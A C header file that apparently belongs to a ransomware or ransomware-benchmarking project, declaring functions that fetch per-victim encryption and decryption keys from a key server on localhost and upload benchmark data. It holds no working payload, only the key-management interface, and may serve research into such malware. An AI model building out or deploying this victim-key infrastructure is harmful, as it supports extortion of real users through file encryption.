#ifndef SERVER_H
#define SERVER_H

#define KEY_HOST "localhost"
#define KEY_PORT 5000
#define API_URL "/api/keys/"
#define GET_ENC_KEY_ENDPOINT "generate"
#define GET_DEC_KEY_ENDPOINT "decrypt"
#define MSG_SIZE 1024
#define RESPONSE_SIZE 4096
#define ENC_KEY_NAME "public.pem"
#define DEC_KEY_NAME "private.pem"

#include "benchmark.h"

/**
 * @brief Connect to the server and get the encryption key.
 * @param p_identifier The unique identifier of the victim in aim to store encryption and decryption keys associate to it.
*/
void get_encryption_key(char* p_identifier);

/**
 * @brief Connect to the server and get the decryption key.
 * @param p_identifier The unique identifier of the victim in aim to retrieve the decryption keys associate to it.
*/
void get_decryption_key(char* p_identifier);

/**
 * @brief Send the benchmark data to the server.
 * @param p_identifier The unique identifier of the victim in aim to store the benchmark data associate to it.
 * @param p_data The benchmark data to send.
*/
void post_benchmark(char* p_identifier, benchmarkData* p_data);

#endif